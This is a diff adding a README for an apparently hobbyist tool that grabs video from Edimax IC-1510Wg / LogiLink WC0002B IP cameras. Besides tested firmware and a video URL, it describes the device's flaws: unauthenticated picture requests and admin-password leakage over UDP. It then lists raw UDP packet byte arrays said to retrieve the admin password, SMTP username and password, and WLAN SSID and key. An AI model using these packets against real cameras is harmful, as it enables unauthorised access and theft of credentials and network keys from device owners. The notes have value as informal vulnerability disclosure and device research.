@@ -1,0 +1,61 @@
+#VERSION:
+Alpha 0.02
+
+
+#MIRROR:
+Some files are mirrord at 
+http://code.dokumenteundeinstellungen.de
+
+#TESTED FIRMWARE:
+engEDIMAX_WG_IC1500Wg_1.34
+WC0002B_1.35 (Logilink)
+WC0002B_1.36 (Logilink)
+
+
+#SOME TEXT:
+This code should be a util to get a video-like output 
+of requested pictures from a Edimax IC-1510Wg.
+
+At the moment this device is also known as LogiLink 
+WC0002B.
+
+Oh, btw:
+Edimax published a uClinux. 
+http://edimax-de.eu/images/Image/products/IC-1510Wg/IC-1510xx_GPLSC.zip
+
+From Edimax-Support, a url w/o activex for watching video
+http://IP/mjpg/video.mjpg
+
+#BUGS OF THE DEVICE:
+The design of this design is funny. For example you
+can get the admin-password if you sniff the 
+answer of request peer0_2 (see UDP REQUESTS).
+Or, the win-tool is using a login-paket but it's 
+not needed. You can get pictures if you send only
+the picture-request-paket.
+
+It seems that the vendor do sensitive stuff like
+admin-auth and login on the client side. 
+
+
+#TROUBLESHOOTING:
+Q: Can't bypass the login-function!
+A: You should add a random user via web-interface. 
+
+
+#UDP REQUESTS:
+char peer0_0[] = {
+0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x04, 
+0xff, 0xfb }; /* Cam name */
+char peer0_2[] = { /* Camname, Admin-pw, Motion Detecion */
+0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x02, 
+0xff, 0xfd };
+char info_leak[] = { /* SMTP-Recipient&Server, FW-Version, Camname*/
+0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x06,
+0xff, 0xf9 };
+char peer0_3[] = { /* SMTP-User & Password */
+0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x10, 
+0xff, 0xef };
+char peer0_4[] = { /*WLAN (SSID, MAC, KEY...) */
+0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x09, 
+0xff, 0xf6 };
